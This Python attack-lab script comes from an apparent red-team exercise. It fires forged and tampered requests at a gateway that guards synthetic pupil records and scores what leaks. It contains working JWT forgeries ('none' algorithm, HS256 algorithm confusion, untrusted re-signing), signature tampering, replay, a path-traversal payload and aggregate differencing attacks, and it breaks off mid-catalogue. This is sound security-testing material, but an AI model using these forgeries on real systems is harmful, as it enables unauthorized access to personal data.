"""Attack lab for the local board.

Fires adversarial requests at a gateway and scores what comes back against the Day 2
rules in day_2_attack/ATTACK_SCORING.md. Two target modes:

- own:  our own deployment. gateway/state holds the issuer key, so the lab can mint, forge
        and revoke any mandate, and signs with gateway/state/agent.pem. Every vector is available.
- byo:  another team's gateway, from day_2_attack/targets/<team>/. The lab holds only the
        mandate they gave us plus our own attack key (day_2_attack/attack.pem), so it signs with
        that key and the mint/forge/revoke vectors that need our issuer are greyed out.

Private keys stay on disk. Findings carry claims, the request body (the evidence a scored
flag needs), decisions and leak analysis, never a private key. Headless:

    uv run python local_view/attacks.py --target own --url http://localhost:8082
    uv run python local_view/attacks.py --target own --group forged
"""

from __future__ import annotations

import argparse
import hashlib
import hmac
import json
import os
import secrets
import sys
import threading
import time
import urllib.error
import urllib.request
from dataclasses import dataclass, field
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))  # importable as a standalone CLI, like server.py

import jwt

from gateway import eval as ev
from gateway.cli import DEFAULT_DENY, DEFAULT_SCOPE, issue_mandate, load_agent_pub, revoke_mandate
from gateway.lib.common import (
    b64u,
    generate_keypair,
    jwk_to_pub,
    priv_from_pem,
    priv_to_pem,
    pub_to_jwk,
    pub_to_pem,
    sign_bytes,
)
from gateway.lib.gateway_verify import (
    Request,
    result_levels,
    sensitivity_maps,
    sensitivity_record,
)
from gateway.main import _CLASSIFICATION_CANDIDATES

ROOT = Path(__file__).resolve().parents[1]
STATE = ROOT / "gateway" / "state"
ATTACK = ROOT / "day_2_attack"
TARGETS = ATTACK / "targets"
ATTACK_KEY = ATTACK / "attack.pem"
SAVED = Path(__file__).with_name("saved_vectors.json")

SERVER = "pupil-data"
ROLE = "safeguarding-lead"
CENSUS = ev.CENSUS
SCHOOLS, MANIFEST = ev.SCHOOLS, ev.MANIFEST
NAMES_CSV = "synthetic/synthetic_display_names.csv"
CENSUS_CSV = "synthetic/synthetic_personal_data_school_census.csv"
DEPRIVATION_CSV = "synthetic/synthetic_personal_data_deprivation.csv"
TTL = 3600

HTTP_OK, HTTP_STEP_UP, HTTP_FORBIDDEN, HTTP_TOOL_ERROR, HTTP_CRASH = 200, 202, 403, 502, 500
BULK_THRESHOLD = 100
JWT_PARTS = 3
SKEW = 600  # past the gateway's 30 s mandate skew and 300 s request window

# day_2_attack/ATTACK_SCORING.md. The scoring doc lists FSMeligible (level 3) and
# InCareAtCurrentSchool (level 4) as P0011 flags, but P0011's value for both is 0, so the lab
# detects the column/row disclosure, not value == 1. Only Ethnicity (ASIA) is a positive special
# category value for P0011. P0586 is the one in-care pupil at SCH07, so its in-care flag is a real 1.
FLAG = {
    "pupil": "P0011",
    "urn": "SCH04",
    "school": "Dunmore Community College",
    "name": "Zara Okafor",
    "deprivation": "0.2505",
    "ethnicity": "ASIA",
}
NAMED = {"pupil": "P0586", "urn": "SCH07", "name": "Mason Owusu"}
DATA_POINTS = {"L2": 10, "L3": 20, "L4": 40, "L4-named": 60}
BREAK_POINTS = {"keys": 50, "forged": 30, "dead": 15, "nokey": 15, "bulk": 10, "unseen": 10, "crash": 5}

# Mandates the own-mode lab mints for itself. The default is the Day 2 default attack mandate.
_DEFAULT_MINT = {
    "scope": DEFAULT_SCOPE,
    "deny": DEFAULT_DENY,
    "clearance": 4,
    "role": ROLE,
    "purpose": "Day 2 default attack mandate",
    "principal": "attacker:lab",
    "org": "lab",
}
_FEATURE_MINT = {
    "scope": [{"server": SERVER, "tools": ["aggregate"], "constraints": {"table": [CENSUS]}}],
    "deny": DEFAULT_DENY,
    "clearance": 2,
    "purpose": "Day 2 feature attack mandate",
    "principal": "attacker:lab",
    "org": "lab",
}

_ISSUE = threading.Lock()


# ---------------------------------------------------------------- http


def _http(url: str, data: bytes | None = None, timeout: float = 20) -> tuple[int, object]:
    headers = {"content-type": "application/json"} if data is not None else {}
    req = urllib.request.Request(url, data=data, headers=headers)  # noqa: S310
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:  # noqa: S310
            body = resp.read()
            return resp.status, (json.loads(body) if body else {})
    except urllib.error.HTTPError as exc:
        raw = exc.read()
        try:
            return exc.code, (json.loads(raw) if raw else {})
        except json.JSONDecodeError:
            return exc.code, {"error": raw.decode(errors="replace")}
    except (urllib.error.URLError, TimeoutError, json.JSONDecodeError) as exc:
        return 0, {"error": str(exc)}


def bind_http(base_url: str):
    """A callable http(path, body=None) -> (status, json) bound to one gateway URL."""
    base = base_url.rstrip("/")

    def http(path: str, body: object = None) -> tuple[int, object]:
        data = json.dumps(body).encode() if body is not None else None
        return _http(f"{base}{path}", data)

    return http


# ---------------------------------------------------------------- tokens


def _claims(token: str) -> dict:
    try:
        return jwt.decode(token, options={"verify_signature": False})
    except jwt.PyJWTError:
        return {}


def _header(token: str) -> dict:
    try:
        return jwt.get_unverified_header(token)
    except jwt.PyJWTError:
        return {}


def _read(path: Path) -> str:
    return path.read_text().strip() if path.is_file() else ""


def _assemble(header: dict, claims: dict, sig: str) -> str:
    head = b64u(json.dumps(header, separators=(",", ":")).encode())
    body = b64u(json.dumps(claims, separators=(",", ":")).encode())
    return f"{head}.{body}.{sig}"


def _issuer_pub_pem() -> bytes | None:
    doc = json.loads(_read(STATE / "trusted_list.json") or "{}")
    for kid_map in doc.get("issuers", {}).values():
        for jwk in kid_map.values():
            return pub_to_pem(jwk_to_pub(jwk))
    return None


def _forge_token(token: str, forge: dict) -> str:
    """Transform a mandate. op: keep-sig, none, random-issuer, issuer, hs256, swap-cnf."""
    op = forge.get("op", "keep-sig")
    header = {**_header(token), **(forge.get("header") or {})}
    claims = _claims(token)
    for key in forge.get("del") or []:
        claims.pop(key, None)
    claims.update(forge.get("set") or {})
    typ, kid = header.get("typ", "mandate+jwt"), header.get("kid", "")
    parts = token.split(".")
    orig_sig = parts[2] if len(parts) >= JWT_PARTS else ""
    if op == "swap-cnf":  # rebind to a key we hold, keep the issuer signature -> SIG_INVALID
        _priv, pub = generate_keypair()
        claims["cnf"] = {"jwk": pub_to_jwk(pub)}
        op = "keep-sig"
    if op == "keep-sig":  # edit claims or header, keep the issuer signature
        return _assemble(header, claims, orig_sig)
    if op == "none":  # unsigned token, alg none
        return _assemble({**header, "alg": "none"}, claims, "")
    if op == "hs256":  # alg confusion: HMAC the token with the issuer public key as the secret
        # PyJWT refuses an asymmetric PEM as an HMAC key, so hand-roll the forgery the classic attack uses.
        secret = _issuer_pub_pem() or b"public"
        head = b64u(json.dumps({"alg": "HS256", "typ": typ, "kid": kid}, separators=(",", ":")).encode())
        payload = b64u(json.dumps(claims, separators=(",", ":"), default=str).encode())
        signing_input = f"{head}.{payload}"
        return f"{signing_input}.{b64u(hmac.new(secret, signing_input.encode(), hashlib.sha256).digest())}"
    if op == "random-issuer":  # a valid EdDSA signature from an issuer the gateway never trusted
        key: object = priv_to_pem(generate_keypair()[0])
        alg = "EdDSA"
    elif op == "issuer":  # own only: our real issuer re-signs, to set nbf/exp or drop a claim validly
        key = priv_to_pem(priv_from_pem((STATE / "issuer_key.pem").read_bytes()))
        alg = "EdDSA"
    else:
        return token
    return jwt.encode(claims, key, algorithm=alg, headers={"typ": typ, "kid": kid})


# ---------------------------------------------------------------- mandates


def _mint(spec: dict) -> tuple[str, int]:
    extra: dict = {}
    if "clearance" in spec:
        extra["clearance"] = spec["clearance"]
    if spec.get("role") is not None:
        extra["role"] = spec["role"]
    extra.update(spec.get("extra") or {})
    with _ISSUE:
        return issue_mandate(
            STATE,
            load_agent_pub(STATE / "agent.pem"),
            scope=spec.get("scope", DEFAULT_SCOPE),
            deny=spec.get("deny", DEFAULT_DENY),
            ttl=spec.get("ttl", TTL),
            purpose=spec.get("purpose", "attack lab"),
            principal=spec.get("principal", "attacker:lab"),
            org=spec.get("org", "lab"),
            extra=extra or None,
        )


def _base_token(target: Target, base: str) -> str:
    if target.mode == "byo":
        tok = target.mandates.get(base, "")
        if not tok:
            msg = f"this target has no {base} mandate on disk"
            raise FileNotFoundError(msg)
        return tok
    if base == "live":
        return _read(STATE / "mandate.jwt")
    if base == "feature":
        return _mint(_FEATURE_MINT)[0]
    return _mint(_DEFAULT_MINT)[0]


def _signing_key(target: Target):
    key = target.agent_key
    if not key.is_file():
        msg = f"signing key {key} missing (uv run python -m gateway.cli keygen -o {key})"
        raise FileNotFoundError(msg)
    return priv_from_pem(key.read_bytes())


def _needs_issuer(forge: dict) -> bool:
    return forge.get("op") in ("issuer", "hs256")


def _resolve_mandate(target: Target, mandate: dict):
    """Return (token, signing_priv). Raises PermissionError when a step needs our issuer on a byo target."""
    idx: int | None = None
    if "raw" in mandate:
        token = mandate["raw"]
    elif mandate.get("mint") is not None:
        if not target.can_mint:
            msg = "minting a mandate needs the issuer key (own target only)"
            raise PermissionError(msg)
        token, idx = _mint(mandate["mint"])
    else:
        token = _base_token(target, mandate.get("base", "default"))
    forge = mandate.get("forge")
    if forge:
        if _needs_issuer(forge) and not target.can_mint:
            msg = f"the {forge.get('op')} forge needs the issuer key (own target only)"
            raise PermissionError(msg)
        token = _forge_token(token, forge)
    if mandate.get("revoke"):
        if not target.can_mint:
            msg = "revoking a mandate needs the issuer key (own target only)"
            raise PermissionError(msg)
        if idx is None:
            token, idx = _mint(mandate.get("mint") or _DEFAULT_MINT)
        with _ISSUE:
            revoke_mandate(STATE, idx)
    return token, _signing_key(target)


# ---------------------------------------------------------------- requests


def _build_body(signing_priv, tool: str, arguments: dict, mandate: str, tweaks: dict) -> dict:
    ts = int(time.time()) + int(tweaks.get("ts_offset", 0))
    nonce = tweaks.get("nonce") or secrets.token_urlsafe(16)
    req = Request(server=SERVER, tool=tool, arguments=arguments, mandate=mandate, nonce=nonce, ts=ts, sig="")
    if signing_priv is not None:
        req.sig = sign_bytes(signing_priv, req.signing_input())
    body = dict(req.__dict__)
    after = tweaks.get("mutate_after")
    if after:  # change arguments after signing: the signature no longer covers them
        body["arguments"] = {**arguments, **after}
    sig_mode = tweaks.get("sig", "valid")
    if sig_mode == "blank":
        body["sig"] = ""
    elif sig_mode == "garbage":
        body["sig"] = b64u(bytes(64))
    elif sig_mode == "wrong-key":
        other, _pub = generate_keypair()
        body["sig"] = sign_bytes(other, Request(**body).signing_input())
    return body


# ---------------------------------------------------------------- leak analysis


def _manifest() -> dict:
    for raw in _CLASSIFICATION_CANDIDATES:
        if not raw:
            continue
        path = Path(raw) if Path(raw).is_absolute() else ROOT / raw
        if path.is_file():
            return json.loads(path.read_text())["classification"]
    return {"levels": {}, "tables": {}, "columns": {}}


def _rows(result) -> list[dict]:
    if isinstance(result, list):
        return [r for r in result if isinstance(r, dict)]
    return [result] if isinstance(result, dict) else []


def _pupil_ids(result) -> set[str]:
    return {r["Psuedo ID"] for r in _rows(result) if r.get("Psuedo ID")}


def _scope_urns(scope) -> set[str]:
    urns: set[str] = set()
    for entry in scope if isinstance(scope, list) else []:
        for value in (entry.get("constraints") or {}).get("urn", []) or []:
            urns.add(str(value))
    return urns


def _flags(result, scope) -> list[dict]:
    """The highest scoring flag the result discloses outside the mandate's schools."""
    rows = _rows(result)
    if not rows:
        return []
    text = json.dumps(result, default=str)
    urns = _scope_urns(scope)
    found: list[dict] = []
    named_in_care = any(
        r.get("Psuedo ID") == NAMED["pupil"] and str(r.get("InCareAtCurrentSchool")) == "1" for r in rows
    )
    if NAMED["name"] in text and (named_in_care or NAMED["pupil"] in text) and NAMED["urn"] not in urns:
        found.append(
            {
                "id": "L4-named",
                "points": DATA_POINTS["L4-named"],
                "detail": f"{NAMED['name']} ({NAMED['pupil']}) in care at {NAMED['urn']}",
            }
        )
    p, out = FLAG["pupil"], FLAG["urn"] not in urns
    p_rows = [r for r in rows if r.get("Psuedo ID") == p or p in json.dumps(r, default=str)]
    if p_rows and out:
        if FLAG["ethnicity"] in text or any("InCareAtCurrentSchool" in r or "Ethnicity" in r for r in p_rows):
            found.append(
                {"id": "L4", "points": DATA_POINTS["L4"], "detail": f"{p} special category (Ethnicity/InCare)"}
            )
        elif any("FSMeligible" in r or r.get("URN") == FLAG["urn"] for r in p_rows):
            found.append({"id": "L3", "points": DATA_POINTS["L3"], "detail": f"{p} census row (FSMeligible/URN)"})
    if (FLAG["name"] in text or FLAG["deprivation"] in text) and out:
        found.append(
            {"id": "L2", "points": DATA_POINTS["L2"], "detail": f"{FLAG['name']} / deprivation {FLAG['deprivation']}"}
        )
    best = max(found, key=lambda f: f["points"], default=None)
    return [best] if best else []


def _keys_leaked(texts: list[str]) -> bool:
    pem = _read(STATE / "issuer_key.pem")
    raw = ""
    if pem:
        try:
            raw = b64u(priv_from_pem(pem.encode()).private_bytes_raw())
        except (ValueError, TypeError):
            raw = ""
    for text in texts:
        if not text:
            continue
        if pem and pem in text:
            return True
        if raw and raw in text:
            return True
        if "PRIVATE KEY" in text:
            return True
    return False


def analyse(mandate_claims: dict, tool: str, arguments: dict, result) -> dict:
    clf = _manifest()
    columns, tables = sensitivity_maps(clf) if clf.get("columns") else ({}, {})
    names = {int(level): name for level, name in clf.get("levels", {}).items()}
    max_level = max(names, default=4)
    levels = result_levels(tool, arguments, result, columns, tables, max_level) if result is not None else {}
    record = sensitivity_record(levels, names, mandate_claims.get("clearance"))
    flags = _flags(result, mandate_claims.get("scope"))
    return {
        "level": record["level"],
        "label": record["label"],
        "decided_by": record["decided_by"],
        "rows": None if result is None else len(_rows(result)),
        "distinct_pupils": len(_pupil_ids(result)),
        "flags": flags,
        "data_points": max([0, *[f["points"] for f in flags]]),
    }


# ---------------------------------------------------------------- scoring


def _score(vector: dict, status: int, got: str | None, analysis: dict) -> tuple[str, dict]:
    kind = vector.get("kind", "attack")
    breaks: dict[str, int] = {}
    if status == HTTP_CRASH:
        breaks["crash"] = BREAK_POINTS["crash"]
    if analysis.get("keys_leaked"):
        breaks["keys"] = BREAK_POINTS["keys"]
    if analysis.get("distinct_pupils", 0) > BULK_THRESHOLD:
        breaks["bulk"] = BREAK_POINTS["bulk"]
    allowed = status == HTTP_OK and got == "ALLOW"
    wanted = vector.get("break")
    if wanted and allowed and wanted in BREAK_POINTS:
        breaks[wanted] = BREAK_POINTS[wanted]
    has_data = analysis.get("data_points", 0) > 0
    if kind == "baseline":
        if status == 0:
            return "NO ANSWER", breaks
        return ("OK" if allowed else "BROKE" if status == HTTP_CRASH else "OVER-DENY"), breaks
    if kind == "info":
        return (
            "DATA"
            if allowed and (has_data or analysis.get("rows"))
            else "DENIED"
            if status == HTTP_FORBIDDEN
            else "RAN"
        ), breaks
    if status == HTTP_CRASH:
        return "BROKE", breaks
    if status == 0:
        return "NO ANSWER", breaks
    landed = analysis.get("keys_leaked") or (
        allowed and (has_data or bool(wanted) or analysis.get("distinct_pupils", 0) > BULK_THRESHOLD)
    )
    return ("LANDED" if landed else "HELD"), breaks


def _trim_claims(claims: dict) -> dict:
    status = (claims.get("status") or {}).get("status_list") or {}
    return {
        "iss": claims.get("iss"),
        "clearance": claims.get("clearance"),
        "role": claims.get("role"),
        "scope": claims.get("scope"),
        "deny": claims.get("deny"),
        "purpose": claims.get("purpose"),
        "exp": claims.get("exp"),
        "nbf": claims.get("nbf"),
        "idx": status.get("idx"),
    }


def _finding(
    vector: dict,
    *,
    status=None,
    got=None,
    reason=None,
    detail="",
    analysis=None,
    request=None,
    mandate_claims=None,
    disclosure=None,
    sensitivity=None,
    error=None,
    notes=None,
) -> dict:
    analysis = analysis or {}
    outcome, breaks = ("ERROR", {}) if error else _score(vector, status or 0, got, analysis)
    return {
        "id": vector["id"],
        "group": vector["group"],
        "title": vector["title"],
        "kind": vector.get("kind", "attack"),
        "type": vector.get("type", "request"),
        "needs_mint": vector.get("needs_mint", False),
        "note": vector.get("note", ""),
        "break_label": vector.get("break"),
        "status": status,
        "got": got,
        "reason": reason,
        "detail": detail,
        "outcome": outcome,
        "breaks": breaks,
        "points": analysis.get("data_points", 0) + sum(breaks.values()),
        "level": analysis.get("level", 0),
        "label": analysis.get("label", ""),
        "decided_by": analysis.get("decided_by", []),
        "flags": analysis.get("flags", []),
        "rows": analysis.get("rows"),
        "distinct_pupils": analysis.get("distinct_pupils", 0),
        "request": request or {},
        "mandate_claims": _trim_claims(mandate_claims or {}),
        "disclosure": disclosure,
        "sensitivity": sensitivity,
        "notes": notes or [],
        "error": error,
    }


# ---------------------------------------------------------------- runners


def _run_request(target: Target, vector: dict, http) -> dict:
    token, signing_priv = _resolve_mandate(target, vector.get("mandate") or {})
    claims = _claims(token)
    tweaks = dict(vector.get("tweaks") or {})
    tool, arguments = vector.get("tool", "search"), vector.get("arguments") or {}
    replay = bool(tweaks.get("replay"))
    responses: list[tuple[int, dict]] = []
    body: dict = {}
    rounds = 2 if replay else max(1, int(tweaks.get("repeat", 1)))
    for _round in range(rounds):
        if not (replay and responses):  # replay sends the very same body (same nonce) a second time
            body = _build_body(signing_priv, tool, arguments, token, tweaks)
        status, payload = http("/tools/call", body)
        responses.append((status, payload if isinstance(payload, dict) else {}))
    status, payload = responses[-1]
    decision = payload.get("decision") or {}
    result = payload.get("result")
    distinct: set[str] = set()
    for _s, resp in responses:
        distinct |= _pupil_ids(resp.get("result"))
    analysis = analyse(claims, tool, arguments, result)
    analysis["distinct_pupils"] = len(distinct)
    analysis["keys_leaked"] = _keys_leaked([json.dumps(resp, default=str) for _s, resp in responses])
    notes = []
    if tweaks.get("replay"):
        notes.append(f"first call HTTP {responses[0][0]}, replay HTTP {responses[-1][0]}")
    return _finding(
        vector,
        status=status,
        got=decision.get("decision"),
        reason=decision.get("reason_code"),
        detail=decision.get("detail") or payload.get("error") or "",
        analysis=analysis,
        request=body,
        mandate_claims=claims,
        disclosure=decision.get("disclosure"),
        sensitivity=decision.get("sensitivity"),
        notes=notes,
    )


def _run_demo(_target: Target, vector: dict, http) -> dict:
    mint = vector.get("demo_mandate") or {"urn": FLAG["urn"], "tools": ["pupil", "search"], "clearance": 4}
    call = vector.get("demo_call") or {"tool": "pupil", "arguments": {"pupil_id": FLAG["pupil"], "urn": FLAG["urn"]}}
    m_status, m_payload = http("/demo/mandate", mint)
    m_payload = m_payload if isinstance(m_payload, dict) else {}
    if m_status != HTTP_OK:
        return _finding(
            vector,
            status=m_status,
            got=None,
            reason=None,
            detail=m_payload.get("error") or "the target exposes no /demo/mandate route",
            notes=["/demo/mandate did not mint a mandate"],
        )
    c_status, c_payload = http("/demo/call", call)
    c_payload = c_payload if isinstance(c_payload, dict) else {}
    inner = c_payload.get("response") if isinstance(c_payload.get("response"), dict) else {}
    status = c_payload.get("status", c_status)
    decision = inner.get("decision") or {}
    claims = m_payload.get("claims") or {}
    analysis = analyse(claims, call["tool"], call.get("arguments") or {}, inner.get("result"))
    analysis["keys_leaked"] = _keys_leaked([json.dumps(c_payload, default=str)])
    return _finding(
        vector,
        status=status,
        got=decision.get("decision"),
        reason=decision.get("reason_code"),
        detail=decision.get("detail") or "the target minted a mandate through its own demo route",
        analysis=analysis,
        request={"demo_mandate": mint, "demo_call": call},
        mandate_claims=claims,
        notes=["/demo/mandate minted a mandate on request"],
    )


def _run_discovery(_target: Target, vector: dict, http) -> dict:
    path = vector.get("path", "/describe")
    status, payload = http(path, None)
    text = json.dumps(payload, default=str)
    analysis = {
        "keys_leaked": _keys_leaked([text]),
        "flags": [],
        "data_points": 0,
        "level": 0,
        "label": "",
        "distinct_pupils": 0,
        "rows": None,
    }
    return _finding(
        vector,
        status=status,
        got="LEAK" if analysis["keys_leaked"] else None,
        reason=None,
        detail="a private key appears in the response"
        if analysis["keys_leaked"]
        else f"{path} answered without a private key",
        analysis=analysis,
        request={"GET": path},
    )


def run_vector(target: Target, vector: dict, http) -> dict:
    runner = {"demo": _run_demo, "discovery": _run_discovery}.get(vector.get("type", "request"), _run_request)
    try:
        return runner(target, vector, http)
    except (PermissionError, FileNotFoundError, ValueError, KeyError, jwt.PyJWTError) as exc:
        return _finding(vector, error=f"{type(exc).__name__}: {exc}")


def _runnable(target: Target, vector: dict) -> bool:
    return target.mode == "own" or not vector.get("needs_mint")


def run_group(target: Target, group: str, http) -> list[dict]:
    return [run_vector(target, v, http) for v in catalog() if v["group"] == group and _runnable(target, v)]


def run_all(target: Target, http) -> list[dict]:
    return [run_vector(target, v, http) for v in catalog() if _runnable(target, v)]


def compose(target: Target, spec: dict, http) -> dict:
    vector = {
        "id": spec.get("id", "manual"),
        "group": spec.get("group", "manual"),
        "title": spec.get("title", "manual attack"),
        **spec,
    }
    return run_vector(target, vector, http)


# ---------------------------------------------------------------- targets


@dataclass
class Target:
    label: str
    url: str
    mode: str  # own | byo
    mandates: dict[str, str] = field(default_factory=dict)
    agent_key: Path = STATE / "agent.pem"

    @property
    def can_mint(self) -> bool:
        return self.mode == "own"


def _own_ready() -> bool:
    return (STATE / "issuer_key.pem").is_file() and (STATE / "agent.pem").is_file()


def targets() -> list[dict]:
    rows: list[dict] = []
    if _own_ready():
        rows.append(
            {
                "id": "own",
                "label": "Our gateway (mint)",
                "mode": "own",
                "url": "",
                "mandates": ["default", "feature", "live"],
            }
        )
    for cfg in sorted(TARGETS.glob("*/target.json")) if TARGETS.is_dir() else []:
        meta = json.loads(cfg.read_text())
        rows.append(
            {
                "id": cfg.parent.name,
                "label": meta.get("label", cfg.parent.name),
                "mode": "byo",
                "url": meta.get("url", ""),
                "mandates": [name for name in ("default", "feature") if (cfg.parent / f"{name}.jwt").is_file()],
            }
        )
    return rows


def load_target(target_id: str, url: str | None = None) -> Target:
    if target_id == "own":
        return Target("Our gateway (mint)", url or "", "own")
    cfg = TARGETS / target_id / "target.json"
    meta = json.loads(cfg.read_text()) if cfg.is_file() else {}
    mandates: dict[str, str] = {}
    for name in ("default", "feature"):
        tok = _read(cfg.parent / f"{name}.jwt")
        if tok:
            mandates[name] = tok
    return Target(meta.get("label", target_id), url or meta.get("url", ""), "byo", mandates, ATTACK_KEY)


# ---------------------------------------------------------------- catalogue

# Each vector: id, group, title, kind (attack|baseline|info), needs_mint, mandate, tool, arguments,
# tweaks, break (the Day 2 break it earns if it lands), note (why a sound gateway holds it).
_CATALOG: list[dict] = [
    # --- baseline: the default mandate must keep working (an over-deny guard, question 0) ---
    {
        "id": "base-search",
        "group": "baseline",
        "kind": "baseline",
        "title": "search own school (SCH01)",
        "mandate": {"base": "default"},
        "tool": "search",
        "arguments": {"query": "P0004", "urn": "SCH01"},
        "note": "The default mandate allows search at SCH01; denying it is an over-deny that fails question 0.",
    },
    {
        "id": "base-get-schools",
        "group": "baseline",
        "kind": "baseline",
        "title": "get the schools file",
        "mandate": {"base": "default"},
        "tool": "get",
        "arguments": {"path": SCHOOLS},
        "note": "The schools file is in the default mandate and level 1.",
    },
    {
        "id": "base-get-manifest",
        "group": "baseline",
        "kind": "baseline",
        "title": "get the manifest",
        "mandate": {"base": "default"},
        "tool": "get",
        "arguments": {"path": MANIFEST},
        "note": "The manifest is public and in the default mandate.",
    },
    # --- data flags with the default mandate (should all be denied before forwarding) ---
    {
        "id": "data-search-flag",
        "group": "data",
        "kind": "attack",
        "title": "search the flag pupil at SCH04",
        "mandate": {"base": "default"},
        "tool": "search",
        "arguments": {"query": FLAG["pupil"], "urn": FLAG["urn"]},
        "note": "SCH04 is outside the default mandate's SCH01; CONSTRAINT_VIOLATED holds it.",
    },
    {
        "id": "data-search-nourn",
        "group": "data",
        "kind": "attack",
        "title": "search the flag pupil with no school",
        "mandate": {"base": "default"},
        "tool": "search",
        "arguments": {"query": FLAG["pupil"]},
        "note": "urn is a required constraint; CONSTRAINT_MISSING holds it.",
    },
    {
        "id": "data-pupil-flag",
        "group": "data",
        "kind": "attack",
        "title": "full record of the flag pupil",
        "mandate": {"base": "default"},
        "tool": "pupil",
        "arguments": {"pupil_id": FLAG["pupil"], "urn": FLAG["urn"]},
        "note": "pupil is not in the default scope; OUT_OF_SCOPE holds it.",
    },
    {
        "id": "data-pupil-named",
        "group": "data",
        "kind": "attack",
        "title": "the named in-care pupil at SCH07",
        "mandate": {"base": "default"},
        "tool": "pupil",
        "arguments": {"pupil_id": NAMED["pupil"], "urn": NAMED["urn"]},
        "note": "The level-4 named flag. pupil is out of scope on the default mandate.",
    },
    {
        "id": "data-get-census",
        "group": "data",
        "kind": "attack",
        "title": "get the whole census file",
        "mandate": {"base": "default"},
        "tool": "get",
        "arguments": {"path": CENSUS_CSV, "limit": 99999},
        "note": "The census path is not in the default mandate; CONSTRAINT_VIOLATED holds it.",
    },
    {
        "id": "data-get-names",
        "group": "data",
        "kind": "attack",
        "title": "get every pupil's name",
        "mandate": {"base": "default"},
        "tool": "get",
        "arguments": {"path": NAMES_CSV},
        "note": "The names file is out of the default mandate; CONSTRAINT_VIOLATED holds it.",
    },
    {
        "id": "data-get-traversal",
        "group": "data",
        "kind": "attack",
        "title": "reach the census through ..",
        "mandate": {"base": "default"},
        "tool": "get",
        "arguments": {"path": "synthetic/../synthetic/synthetic_personal_data_school_census.csv"},
        "note": "normpath on both sides means the traversal still resolves to a path outside the mandate.",
    },
    {
        "id": "data-roster-flag",
        "group": "data",
        "kind": "attack",
        "title": "roster the flag pupil's cohort",
        "mandate": {"base": "default"},
        "tool": "roster",
        "arguments": {"urn": FLAG["urn"], "year_group": 11, "academic_year": "2021/22"},
        "note": "roster is out of the default scope; OUT_OF_SCOPE holds it.",
    },
    {
        "id": "data-draft-flag",
        "group": "data",
        "kind": "attack",
        "title": "draft a letter naming the flag pupil",
        "mandate": {"base": "default"},
        "tool": "draft",
        "arguments": {"urn": FLAG["urn"], "pupil_ids": [FLAG["pupil"]]},
        "note": "draft is out of scope and a step-up tool; it must not forward.",
    },
    # --- escalated mandates (own-mode): show what defences catch and what a broad mandate leaks ---
    {
        "id": "own-pupil-norole",
        "group": "data",
        "kind": "attack",
        "needs_mint": True,
        "title": "pupil at SCH04, clearance 4, no role",
        "mandate": {
            "mint": {
                "scope": [{"server": SERVER, "tools": ["pupil"], "constraints": {"urn": [FLAG["urn"]]}}],
                "clearance": 4,
            }
        },
        "tool": "pupil",
        "arguments": {"pupil_id": FLAG["pupil"], "urn": FLAG["urn"]},
        "note": "Level 4 without a listed role must be held with ROLE_REQUIRED.",
    },
    {
        "id": "own-pupil-low",
        "group": "data",
        "kind": "attack",
        "needs_mint": True,
        "title": "pupil at SCH04, clearance 2",
        "mandate": {
            "mint": {
                "scope": [{"server": SERVER, "tools": ["pupil"], "constraints": {"urn": [FLAG["urn"]]}}],
                "clearance": 2,
                "role": ROLE,
            }
        },
        "tool": "pupil",
        "arguments": {"pupil_id": FLAG["pupil"], "urn": FLAG["urn"]},
        "note": "Ethnicity/InCare are level 4; clearance 2 must be held with CLEARANCE_TOO_LOW.",
    },
    {
        "id": "own-pupil-full",
        "group": "data",
        "kind": "info",
        "needs_mint": True,
        "title": "pupil at SCH04, clearance 4 + role",
        "mandate": {
            "mint": {
                "scope": [{"server": SERVER, "tools": ["pupil"], "constraints": {"urn": [FLAG["urn"]]}}],
                "clearance": 4,
                "role": ROLE,
            }
        },
        "tool": "pupil",
        "arguments": {"pupil_id": FLAG["pupil"], "urn": FLAG["urn"]},
        "note": "With the right mandate the full level-4 record is returned by design; shows the data is reachable.",
    },
    {
        "id": "own-named-full",
        "group": "data",
        "kind": "info",
        "needs_mint": True,
        "title": "named in-care pupil, clearance 4 + role",
        "mandate": {
            "mint": {
                "scope": [{"server": SERVER, "tools": ["pupil"], "constraints": {"urn": [NAMED["urn"]]}}],
                "clearance": 4,
                "role": ROLE,
            }
        },
        "tool": "pupil",
        "arguments": {"pupil_id": NAMED["pupil"], "urn": NAMED["urn"]},
        "note": "The level-4 named flag (Mason Owusu), reachable with a correct mandate.",
    },
    # --- aggregate quasi-identifier and differencing (own-mode counts mandate) ---
    {
        "id": "agg-by-pupil",
        "group": "aggregate",
        "kind": "attack",
        "needs_mint": True,
        "title": "aggregate grouped by pupil id",
        "mandate": {
            "mint": {
                "scope": [{"server": SERVER, "tools": ["aggregate"], "constraints": {"table": [CENSUS]}}],
                "clearance": 4,
                "role": ROLE,
            }
        },
        "tool": "aggregate",
        "arguments": {"table": CENSUS, "group_by": ["Psuedo ID"], "measure": "FSMeligible"},
        "note": "Grouping by an identifier makes each group one pupil; TOO_FINE holds it.",
    },
    {
        "id": "agg-where-pupil",
        "group": "aggregate",
        "kind": "attack",
        "needs_mint": True,
        "title": "aggregate filtered to one pupil",
        "mandate": {
            "mint": {
                "scope": [{"server": SERVER, "tools": ["aggregate"], "constraints": {"table": [CENSUS]}}],
                "clearance": 4,
                "role": ROLE,
            }
        },
        "tool": "aggregate",
        "arguments": {
            "table": CENSUS,
            "group_by": ["URN"],
            "measure": "FSMeligible",
            "where": {"Psuedo ID": FLAG["pupil"]},
        },
        "note": "A where on an identifier also singles out one pupil; TOO_FINE holds it.",
    },
    {
        "id": "agg-measure-l4-low",
        "group": "aggregate",
        "kind": "attack",
        "needs_mint": True,
        "title": "care count at clearance 3",
        "mandate": {
            "mint": {
                "scope": [{"server": SERVER, "tools": ["aggregate"], "constraints": {"table": [CENSUS]}}],
                "clearance": 3,
            }
        },
        "tool": "aggregate",
        "arguments": {"table": CENSUS, "group_by": ["URN"], "measure": "InCareAtCurrentSchool"},
        "note": "The measure column is level 4; clearance 3 must be held with CLEARANCE_TOO_LOW.",
    },
    {
        "id": "agg-group-of-one",
        "group": "aggregate",
        "kind": "info",
        "needs_mint": True,
        "title": "in-care count at SCH07 (group of one)",
        "mandate": {
            "mint": {
                "scope": [{"server": SERVER, "tools": ["aggregate"], "constraints": {"table": [CENSUS]}}],
                "clearance": 4,
                "role": ROLE,
            }
        },
        "tool": "aggregate",
        "arguments": {
            "table": CENSUS,
            "group_by": [],
            "measure": "InCareAtCurrentSchool",
            "where": {"URN": NAMED["urn"]},
        },
